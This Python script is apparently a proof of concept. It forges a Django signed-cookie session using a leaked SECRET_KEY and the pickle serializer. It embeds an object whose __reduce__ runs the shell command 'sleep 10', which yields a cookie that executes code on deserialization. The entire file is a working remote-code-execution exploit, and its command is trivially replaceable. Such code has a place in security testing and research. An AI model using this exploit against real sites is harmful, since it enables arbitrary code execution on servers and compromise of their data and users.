import os
import sys
from dotenv import load_dotenv
load_dotenv()
from django.core.signing import loads, dumps, BadSignature
from django.contrib.sessions import serializers
from settings import banner

# Clean the terminal, cmd and print the banner
os.system("cls" if os.name == 'nt' else "clear")
print(banner())


def __reduce__(self):
    return os.system, ("sleep 10",)


# Define a class using objects (In Python, everything is an object) :)
Poc = type(
    "POC",
    (object,),
    {"__reduce__": __reduce__}
)

# Leaked SECRET KEY and Sample of cookie generated by target website
SECRET_KEY, COOKIE = os.environ.get("SECRET_KEY"), os.environ.get("COOKIE")

# Check if secret key match the cookie
try:
    new_content = loads(COOKIE, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                       salt='django.contrib.sessions.backends.signed_cookies')
except BadSignature:
    print("SECRET_KEY does not match the sample cookie")
    sys.exit()

# Instance of generated poc
new_content['testcookie'] = Poc()

# Generate the exploit
exploit = dumps(new_content, key=SECRET_KEY, serializer=serializers.PickleSerializer,
                salt='django.contrib.sessions.backends.signed_cookies', compress=True)

print(f"Exploit -> {exploit}")
